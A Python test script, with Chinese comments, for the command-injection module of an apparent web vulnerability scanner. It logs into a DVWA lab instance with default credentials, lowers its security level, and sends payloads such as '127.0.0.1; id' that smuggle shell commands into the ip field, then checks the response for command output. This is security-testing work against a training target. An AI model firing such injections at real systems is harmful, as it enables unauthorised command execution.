"""快速测试 CMDi 模块"""
import asyncio
import sys
import re
sys.stdout.reconfigure(encoding='utf-8')

import httpx
from wvs.core.session import HTTPPool
from wvs.config import ConfigManager

DVWA = "http://192.168.18.131/dvwa"

async def main():
    print("=" * 60)
    print("快速 CMDi 测试")
    print("=" * 60)
    
    # 登录
    async with httpx.AsyncClient(timeout=10, follow_redirects=True, verify=False) as c:
        await c.get(f"{DVWA}/login.php")
        await c.post(f"{DVWA}/login.php", data={"username": "admin", "password": "password", "Login": "Login"})
        r = await c.get(f"{DVWA}/security.php")
        m = re.search(r"user_token'\s*value\s*=\s*'([^']+)'", r.text)
        token = m.group(1) if m else ""
        await c.post(f"{DVWA}/security.php", data={"security": "low", "seclev_submit": "Submit", "user_token": token})
        cookies = dict(c.cookies)
        print("[OK] DVWA ready")
    
    # 创建 session
    config = ConfigManager()
    session = HTTPPool(config)
    for name, value in cookies.items():
        session.set_cookie(DVWA, name, value)
    
    # 手动测试 echo 回显
    print("\n[1] 手动测试 echo 回显...")
    
    # 生成随机 token
    import secrets
    import string
    random_token = ''.join(secrets.choice(string.ascii_lowercase) for _ in range(8))
    
    # 测试 payload
    payloads = [
        f"127.0.0.1; echo {random_token}",
        f"127.0.0.1 | echo {random_token}",
    ]
    
    for payload in payloads:
        print(f"  Payload: {payload}")
        resp = await session.post(
            f"{DVWA}/vulnerabilities/exec/",
            data={"ip": payload, "submit": "submit"}
        )
        
        if random_token in resp.text:
            print(f"    [!] Token '{random_token}' 回显成功！")
            # 检查位置
            idx = resp.text.find(random_token)
            print(f"    上下文: {resp.text[max(0, idx-50):idx+50]}")
        else:
            print(f"    未检测到回显")
    
    # 测试命令执行
    print("\n[2] 测试命令执行 (id)...")
    resp = await session.post(
        f"{DVWA}/vulnerabilities/exec/",
        data={"ip": "127.0.0.1; id", "submit": "submit"}
    )
    
    if "uid=" in resp.text:
        print("  [!] 命令执行成功！")
        # 提取
        match = re.search(r'uid=\d+\([^)]+\)', resp.text)
        if match:
            print(f"  输出: {match.group()}")
    
    await session.close()
    print("\n[OK] 测试完成")

if __name__ == "__main__":
    asyncio.run(main())
